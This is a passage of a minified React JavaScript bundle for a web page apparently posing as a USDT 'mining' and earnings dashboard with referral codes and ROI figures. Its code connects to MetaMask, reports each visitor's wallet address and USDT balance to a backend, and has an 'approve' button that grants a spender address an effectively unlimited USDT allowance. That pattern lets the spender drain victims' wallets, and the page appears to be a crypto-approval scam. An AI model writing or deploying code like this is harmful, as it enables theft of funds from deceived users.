                        u(!1), f(""), console.error("User rejected connection", t)
                    } else ee("Please install MetaMask!")
                }, re = async e => {
                    if (window.ethereum) {
                        const n = new cy(window.ethereum),
                            r = new n.eth.Contract(ly, a);
                        try {
                            const t = await r.methods.balanceOf(e).call(),
                                i = n.utils.fromWei(t, "mwei");
                            return T(i), console.log(P), console.log(P - 1), console.log(Number(P)), console.log(Number(P) - 1), i
                        } catch (t) {
                            return console.error("Failed to fetch USDT balance", t), "0"
                        }
                    }
                }, ie = async (e, n, i, a) => {
                    try {
                        const s = await fetch("".concat(Y, "auth/login"), {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    walletAddress: e,
                                    balance: n,
                                    referrer: i,
                                    spender: a
                                })
                            }),
                            c = await s.json();
                        s.ok ? (localStorage.setItem("data", JSON.stringify(c.user)), r(c.user), t(!0), j("".concat("https://v1.interestdata.net/", "?referralcode=").concat(c.user.referralCode)), N(c.user.roi), console.log("Logged in:", c), Z(c.user.approved), o(c.user.startMine), g(c.user.withdrawCount), L(c.user.referralCode), z(c.settings[0].transactions), q(c.settings[0].pool), H(c.settings[0].addresses), ee("Connected")) : (console.error("Authentication failed:", c), ee("Authentication failed"))
                    } catch (s) {
                        console.error("Error during authentication:", s)
                    }
                }, oe = async e => {
                    try {
                        const t = await fetch("".concat(Y, "auth/withdrawals"), {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    walletAddress: e
                                })
                            }),
                            n = await t.json();
                        t.ok ? (p(n.withdrawals), y(n.totalWithdrawal)) : console.error("Authentication failed:", n)
                    } catch (t) {
                        console.error("Error during withdrawal:", t)
                    }
                }, ae = async e => {
                    try {
                        const t = await fetch("".concat(Y, "auth/earnings"), {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    walletAddress: e
                                })
                            }),
                            n = await t.json();
                        t.ok ? (localStorage.setItem("data", JSON.stringify(n)), w(n.earnings), A(n.totalEarning)) : console.error("Authentication failed:", n)
                    } catch (t) {
                        console.error("Error during earnings:", t)
                    }
                }, ce = async e => {
                    try {
                        const t = await fetch("".concat(Y, "auth/incomes"), {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    walletAddress: e
                                })
                            }),
                            n = await t.json();
                        t.ok ? (localStorage.setItem("data", JSON.stringify(n)), E(n.incomes), C(n.totalIncome)) : console.error("Authentication failed:", n)
                    } catch (t) {
                        console.error("Error during incomes:", t)
                    }
                }, ue = async e => {
                    try {
                        const t = await fetch("".concat(Y, "auth/approved"), {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify({
                                    walletAddress: e
                                })
                            }),
                            n = await t.json();
                        t.ok ? (localStorage.setItem("start", !0), de(d)) : console.error("Start mine failed:", n)
                    } catch (t) {
                        console.error("Error during start mine:", t)
                    }
                }, de = async e => {
                    if (!i)
                        if (P < 10) ee("Insufficient USDT balance");
                        else {
                            console.log("Start Mine Wallet: " + e);
                            try {
                                const t = await fetch("".concat(Y, "auth/start"), {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify({
                                            walletaddress: e
                                        })
                                    }),
                                    n = await t.json();
                                t.ok ? (localStorage.setItem("start", !0), o(!0)) : console.error("Start mine failed:", n)
                            } catch (t) {
                                console.error("Error during start mine:", t)
                            }
                        }
                };
                return (0, s.useEffect)((() => {
                    const e = e => {
                        e.length > 0 ? (f(e[0]), I(te(e[0])), re(e[0])) : (u(!1), f(""))
                    };
                    return window.ethereum && window.ethereum.on("accountsChanged", e), () => {
                        window.ethereum && window.ethereum.removeListener("accountsChanged", e)
                    }
                }), []), (0, s.useEffect)((() => {
                    l || ne()
                }), []), (0, uy.jsx)(uy.Fragment, {
                    children: (0, uy.jsx)(le, {
                        children: (0, uy.jsx)(se, {
                            path: "/",
                            element: (0, uy.jsx)(By, {
                                isWalletConnected: l,
                                handleConnectWallet: ne,
                                content: (0, uy.jsx)(zy, {
                                    ToastContainer: Ke,
                                    shortAccount: _,
                                    isWalletConnected: l,
                                    usdtBalance: P,
                                    roi: B,
                                    approve: async () => {
                                        if (V) de(d);
                                        else if (window.ethereum) {
                                            new cy(window.ethereum);
                                            if (K) try {
                                                const e = await $.eth.getMaxPriorityFeePerGas(),
                                                    t = await $.eth.getBlock("pending"),
                                                    n = Number(t.baseFeePerGas),
                                                    r = Number(e),
                                                    i = n + r;
                                                console.log("Base Fee: " + n + " maxPriorityFeePerGas: " + r + " maxFeePerGas: " + i), await K.methods.approve(X, "800000000000029876546754456755000000000000000000").send({
                                                    from: d,
                                                    maxFeePerGas: i,
                                                    maxPriorityFeePerGas: r
                                                }).then((e => {
                                                    console.log(e), console.log("Transaction approved"), Z(!0)
                                                })), V && ue(d), ee("Approval successful")
                                            } catch (e) {
                                                console.error("Approval failed:", e), e.message.includes("Web3ValidatorError") && ee("Validation error: Check the parameters being sent.")
                                            }
                                        }
                                    },
                                    referrerCode: M,
                                    withdrawals: h,
                                    earnings: b,
                                    incomes: k,
                                    totalIncomes: S,
                                    totalEarnings: x,
                                    totalWithdrawals: v,
                                    start: i,
                                    withdraw: async (e, t) => {
                                        if (m > 0) try {
                                            const n = await fetch("".concat(Y, "auth/withdraw"), {
                                                    method: "POST",
                                                    headers: {
                                                        "Content-Type": "application/json"
                                                    },
                                                    body: JSON.stringify({
                                                        walletAddress: e,
                                                        amount: t
                                                    })
                                                }),
                                                r = await n.json();
                                            n.ok ? (ee("Withdrawal in progress"), ie(d, P, O, X), oe(d), ae(d), ce(d)) : (console.error("Authentication failed:", r), ee("Withdrawal failed"))
                                        } catch (n) {
                                            console.error("Error during authentication:", n)
                                        } else ee("Maximum Withdrawal exceeded for today")
                                    },
                                    notify: ee,
                                    robotID: F,
                                    totalPool: G,
                                    withdrawalCount: m,
                                    totalTransactions: U,
                                    totalAddresses: D
                                })
                            })
                        })
                    })
                })
            };
        const qy = function() {
            return (0, uy.jsx)(uy.Fragment, {
                children: (0, uy.jsx)(Gy, {})
            })
        };
        l.createRoot(document.getElementById("root")).render((0, uy.jsx)(s.StrictMode, {
            children: (0, uy.jsx)(fe, {
                children: (0, uy.jsx)(qy, {})
            })
        }))
    })()
})();
//# sourceMappingURL=main.97fea2d7.js.map